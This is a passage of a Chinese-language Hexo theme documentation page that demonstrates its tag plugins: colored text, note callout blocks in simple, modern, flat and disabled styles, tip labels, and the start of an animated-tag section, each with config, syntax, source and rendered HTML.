id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% p 样式参数(参数以空格划分), 文本内容 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>字体</code>: logo, code</li><li><code>颜色</code>: red,yellow,green,cyan,blue,gray</li><li><code>大小</code>: small, h4, h3, h2, h1, large, huge, ultra</li><li><code>对齐方向</code>: left, center, right</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> 彩色文字</span><br><span class="line">在一段话中方便插入各种颜色的标签，包括：&#123;% p red, 红色 %&#125;、&#123;% p yellow, 黄色 %&#125;、&#123;% p green, 绿色 %&#125;、&#123;% p cyan, 青色 %&#125;、&#123;% p blue, 蓝色 %&#125;、&#123;% p gray, 灰色 %&#125;。</span><br><span class="line"><span class="bullet">-</span> 超大号文字</span><br><span class="line">文档「开始」页面中的标题部分就是超大号文字。</span><br><span class="line">&#123;% p center logo large, Volantis %&#125;</span><br><span class="line">&#123;% p center small, A Wonderful Theme for Hexo %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><ul><li>彩色文字<br>在一段话中方便插入各种颜色的标签，包括：<p class='p red'>红色</p>、<p class='p yellow'>黄色</p>、<p class='p green'>绿色</p>、<p class='p cyan'>青色</p>、<p class='p blue'>蓝色</p>、<p class='p gray'>灰色</p>。</li><li>超大号文字<br>文档「开始」页面中的标题部分就是超大号文字。<p class='p center logo large'>Volantis</p><p class='p center small'>A Wonderful Theme for Hexo</p></li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="引用note">引用note</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">通用配置</button></li><li class="tab"><button type="button" data-href="#分栏-2">语法格式</button></li><li class="tab"><button type="button" data-href="#分栏-3">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-4">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-5">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">note:</span><br><span class="line">  # Note tag style values:</span><br><span class="line">  #  - simple    bs-callout old alert style. Default.</span><br><span class="line">  #  - modern    bs-callout new (v2-v3) alert style.</span><br><span class="line">  #  - flat      flat callout style with background, like on Mozilla or StackOverflow.</span><br><span class="line">  #  - disabled  disable all CSS styles import of note tag.</span><br><span class="line">  style: simple</span><br><span class="line">  icons: false</span><br><span class="line">  border<span class="emphasis">_radius: 3</span></span><br><span class="line"><span class="emphasis">  # Offset lighter of background in % for modern and flat styles (modern: -12 | 12; flat: -18 | 6).</span></span><br><span class="line"><span class="emphasis">  # Offset also applied to label tag variables. This option can work with disabled note tag.</span></span><br><span class="line"><span class="emphasis">  light_</span>bg<span class="emphasis">_offset: 0</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 自带icon</span></span><br><span class="line">&#123;% note [class] [no-icon] [style] %&#125;</span><br><span class="line">Any content (support inline tags too.io).</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"><span class="section"># 外部icon</span></span><br><span class="line">&#123;% note [color] [icon] [style] %&#125;</span><br><span class="line">Any content (support inline tags too.io).</span><br><span class="line">&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.自带icon</p><table><thead><tr><th>参数</th><th style="text-align:center">用法</th></tr></thead><tbody><tr><td>class</td><td style="text-align:center">【可选】标识，不同的标识有不同的配色 （ default / primary / success / info / warning / danger ）</td></tr><tr><td>no-icon</td><td style="text-align:center">【可选】不显示 icon</td></tr><tr><td>style</td><td style="text-align:center">【可选】可以覆盖配置中的 style （simple/modern/flat/disabled）</td></tr></tbody></table><p>2.外部icon</p><table><thead><tr><th>参数</th><th style="text-align:center">用法</th></tr></thead><tbody><tr><td>class</td><td style="text-align:center">【可选】标识，不同的标识有不同的配色 （ default / blue / pink / red / purple / orange / green ）</td></tr><tr><td>no-icon</td><td style="text-align:center">【可选】可配置自定义 icon (只支持 fontawesome 图标, 也可以配置 no-icon )</td></tr><tr><td>style</td><td style="text-align:center">【可选】可以覆盖配置中的 style （simple/modern/flat/disabled）</td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><details class="folding-tag" blue><summary> 1.自带icon </summary>              <div class='content'>              <p>1.<code>simple</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note simple %&#125;默认 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default simple %&#125;default 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary simple %&#125;primary 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success simple %&#125;success 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info simple %&#125;info 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning simple %&#125;warning 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger simple %&#125;danger 提示块标签&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>2.<code>modern</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note modern %&#125;默认 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default modern %&#125;default 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary modern %&#125;primary 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success modern %&#125;success 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info modern %&#125;info 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning modern %&#125;warning 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger modern %&#125;danger 提示块标签&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>3.<code>flat</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note flat %&#125;默认 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default flat %&#125;default 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary flat %&#125;primary 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success flat %&#125;success 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info flat %&#125;info 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning flat %&#125;warning 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger flat %&#125;danger 提示块标签&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>4.<code>disabled</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note disabled %&#125;默认 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default disabled %&#125;default 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary disabled %&#125;primary 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success disabled %&#125;success 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info disabled %&#125;info 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning disabled %&#125;warning 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger disabled %&#125;danger 提示块标签&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>5.<code>no-icon</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note no-icon %&#125;默认 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default no-icon %&#125;default 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary no-icon %&#125;primary 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success no-icon %&#125;success 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info no-icon %&#125;info 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning no-icon %&#125;warning 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger no-icon %&#125;danger 提示块标签&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure>              </div>            </details><details class="folding-tag" blue><summary> 2.外部icon </summary>              <div class='content'>              <p>1.<code>simple</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; simple %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; simple %&#125;2021年快到了....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; simple %&#125;小心开车 安全至上&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red &#x27;fas fa-fan&#x27; simple%&#125;这是三片呢？还是四片？&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange &#x27;fas fa-battery-half&#x27; simple %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple &#x27;far fa-hand-scissors&#x27; simple %&#125;剪刀石头布&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; simple %&#125;前端最讨厌的浏览器&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>2.<code>modern</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; modern %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; modern %&#125;2021年快到了....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; modern %&#125;小心开车 安全至上&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red &#x27;fas fa-fan&#x27; modern%&#125;这是三片呢？还是四片？&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange &#x27;fas fa-battery-half&#x27; modern %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple &#x27;far fa-hand-scissors&#x27; modern %&#125;剪刀石头布&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; modern %&#125;前端最讨厌的浏览器&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>3.<code>flat</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; flat %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; flat %&#125;2021年快到了....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; flat %&#125;小心开车 安全至上&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red &#x27;fas fa-fan&#x27; flat%&#125;这是三片呢？还是四片？&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange &#x27;fas fa-battery-half&#x27; flat %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple &#x27;far fa-hand-scissors&#x27; flat %&#125;剪刀石头布&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; flat %&#125;前端最讨厌的浏览器&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>4.<code>disabled</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; disabled %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; disabled %&#125;2021年快到了....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; disabled %&#125;小心开车 安全至上&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red &#x27;fas fa-fan&#x27; disabled %&#125;这是三片呢？还是四片？&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange &#x27;fas fa-battery-half&#x27; disabled %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple &#x27;far fa-hand-scissors&#x27; disabled %&#125;剪刀石头布&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; disabled %&#125;前端最讨厌的浏览器&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>5.<code>no-icon</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note no-icon %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue no-icon %&#125;2021年快到了....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink no-icon %&#125;小心开车 安全至上&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red no-icon %&#125;这是三片呢？还是四片？&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange no-icon %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple no-icon %&#125;剪刀石头布&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green no-icon %&#125;前端最讨厌的浏览器&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure>              </div>            </details><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-5"><details class="folding-tag" blue><summary> 1.自带icon </summary>              <div class='content'>              <p>1.<code>simple</code>样式</p><div class="note simple"><p>默认 提示块标签</p></div><div class="note default simple"><p>default 提示块标签</p></div><div class="note primary simple"><p>primary 提示块标签</p></div><div class="note success simple"><p>success 提示块标签</p></div><div class="note info simple"><p>info 提示块标签</p></div><div class="note warning simple"><p>warning 提示块标签</p></div><div class="note danger simple"><p>danger 提示块标签</p></div>2.`modern`样式<div class="note modern"><p>默认 提示块标签</p></div><div class="note default modern"><p>default 提示块标签</p></div><div class="note primary modern"><p>primary 提示块标签</p></div><div class="note success modern"><p>success 提示块标签</p></div><div class="note info modern"><p>info 提示块标签</p></div><div class="note warning modern"><p>warning 提示块标签</p></div><div class="note danger modern"><p>danger 提示块标签</p></div><p>3.<code>flat</code>样式</p><div class="note flat"><p>默认 提示块标签</p></div><div class="note default flat"><p>default 提示块标签</p></div><div class="note primary flat"><p>primary 提示块标签</p></div><div class="note success flat"><p>success 提示块标签</p></div><div class="note info flat"><p>info 提示块标签</p></div><div class="note warning flat"><p>warning 提示块标签</p></div><div class="note danger flat"><p>danger 提示块标签</p></div><p>4.<code>disabled</code>样式</p><div class="note disabled"><p>默认 提示块标签</p></div><div class="note default disabled"><p>default 提示块标签</p></div><div class="note primary disabled"><p>primary 提示块标签</p></div><div class="note success disabled"><p>success 提示块标签</p></div><div class="note info disabled"><p>info 提示块标签</p></div><div class="note warning disabled"><p>warning 提示块标签</p></div><div class="note danger disabled"><p>danger 提示块标签</p></div><p>5.<code>no-icon</code>样式</p><div class="note no-icon flat"><p>默认 提示块标签</p></div><div class="note default no-icon flat"><p>default 提示块标签</p></div><div class="note primary no-icon flat"><p>primary 提示块标签</p></div><div class="note success no-icon flat"><p>success 提示块标签</p></div><div class="note info no-icon flat"><p>info 提示块标签</p></div><div class="note warning no-icon flat"><p>warning 提示块标签</p></div><div class="note danger no-icon flat"><p>danger 提示块标签</p></div>              </div>            </details><details class="folding-tag" blue><summary> 2.外部icon </summary>              <div class='content'>              <p>1.<code>simple</code>样式</p><div class="note icon-padding simple"><i class="note-icon fab fa-cc-visa"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note blue icon-padding simple"><i class="note-icon fas fa-bullhorn"></i><p>2021年快到了…</p></div><div class="note pink icon-padding simple"><i class="note-icon fas fa-car-crash"></i><p>小心开车 安全至上</p></div><div class="note red icon-padding simple"><i class="note-icon fas fa-fan"></i><p>这是三片呢？还是四片？</p></div><div class="note orange icon-padding simple"><i class="note-icon fas fa-battery-half"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note purple icon-padding simple"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布</p></div><div class="note green icon-padding simple"><i class="note-icon fab fa-internet-explorer"></i><p>前端最讨厌的浏览器</p></div><p>2.<code>modern</code>样式</p><div class="note icon-padding modern"><i class="note-icon fab fa-cc-visa"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>2021年快到了…</p></div><div class="note pink icon-padding modern"><i class="note-icon fas fa-car-crash"></i><p>小心开车 安全至上</p></div><div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>这是三片呢？还是四片？</p></div><div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布</p></div><div class="note green icon-padding modern"><i class="note-icon fab fa-internet-explorer"></i><p>前端最讨厌的浏览器</p></div><p>3.<code>flat</code>样式</p><div class="note icon-padding flat"><i class="note-icon fab fa-cc-visa"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note blue icon-padding flat"><i class="note-icon fas fa-bullhorn"></i><p>2021年快到了…</p></div><div class="note pink icon-padding flat"><i class="note-icon fas fa-car-crash"></i><p>小心开车 安全至上</p></div><div class="note red icon-padding flat"><i class="note-icon fas fa-fan"></i><p>这是三片呢？还是四片？</p></div><div class="note orange icon-padding flat"><i class="note-icon fas fa-battery-half"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note purple icon-padding flat"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布</p></div><div class="note green icon-padding flat"><i class="note-icon fab fa-internet-explorer"></i><p>前端最讨厌的浏览器</p></div><p>4.<code>disabled</code>样式</p><div class="note icon-padding disabled"><i class="note-icon fab fa-cc-visa"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note blue icon-padding disabled"><i class="note-icon fas fa-bullhorn"></i><p>2021年快到了…</p></div><div class="note pink icon-padding disabled"><i class="note-icon fas fa-car-crash"></i><p>小心开车 安全至上</p></div><div class="note red icon-padding disabled"><i class="note-icon fas fa-fan"></i><p>这是三片呢？还是四片？</p></div><div class="note orange icon-padding disabled"><i class="note-icon fas fa-battery-half"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note purple icon-padding disabled"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布</p></div><div class="note green icon-padding disabled"><i class="note-icon fab fa-internet-explorer"></i><p>前端最讨厌的浏览器</p></div><p>5.<code>no-icon</code>样式</p><div class="note no-icon flat"><p>你是刷 Visa 还是 UnionPay</p></div><div class="note blue no-icon flat"><p>2021年快到了…</p></div><div class="note pink no-icon flat"><p>小心开车 安全至上</p></div><div class="note red no-icon flat"><p>这是三片呢？还是四片？</p></div><div class="note orange no-icon flat"><p>你是刷 Visa 还是 UnionPay</p></div><div class="note purple no-icon flat"><p>剪刀石头布</p></div><div class="note green no-icon flat"><p>前端最讨厌的浏览器</p></div>              </div>            </details><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="上标标签-tip">上标标签 tip</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip [参数，可选] %&#125;文本内容&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>样式</code>: success,error,warning,bolt,ban,home,sync,cogs,key,bell</li><li><code>自定义图标</code>: 支持fontawesome。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip %&#125;default&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip info %&#125;info&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip success %&#125;success&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip error %&#125;error&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip warning %&#125;warning&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip bolt %&#125;bolt&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban %&#125;ban&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip home %&#125;home&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip sync %&#125;sync&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip cogs %&#125;cogs&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip key %&#125;key&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip bell %&#125;bell&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip fa-atom %&#125;自定义font awesome图标&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class="tip "><p>default</p></div><div class="tip info"><p>info</p></div><div class="tip success"><p>success</p></div><div class="tip error"><p>error</p></div><div class="tip warning"><p>warning</p></div><div class="tip bolt"><p>bolt</p></div><div class="tip ban"><p>ban</p></div><div class="tip home"><p>home</p></div><div class="tip sync"><p>sync</p></div><div class="tip cogs"><p>cogs</p></div><div class="tip key"><p>key</p></div><div class="tip bell"><p>bell</p></div><div class="tip fa-atom"><p>自定义font awesome图标</p></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="动态标签-anima">动态标签 anima</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip [参数，可选] %&#125;文本内容&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><div class="note info flat"><ol><li>将所需的CSS类添加到图标（或DOM中的任何元素）。</li><li>对于父级悬停样式，需要给目标元素添加指定CSS类，同时还要给目标元素的父级元素添加CSS类 <code>faa-parent animated-hover</code>。（详情见示例及示例源码）<br>You can regulate the speed of the animation by adding the CSS class or . faa-fastfaa-slow</li><li>可以通过给目标元素添加CSS类 <code>faa-fast</code>或 <code>faa-slow</code>来控制动画快慢。</li></ol></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.On DOM load（当页面加载时显示动画）</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip warning faa-horizontal animated %&#125;warning&#123;% endtip %&#125;</span><br><span 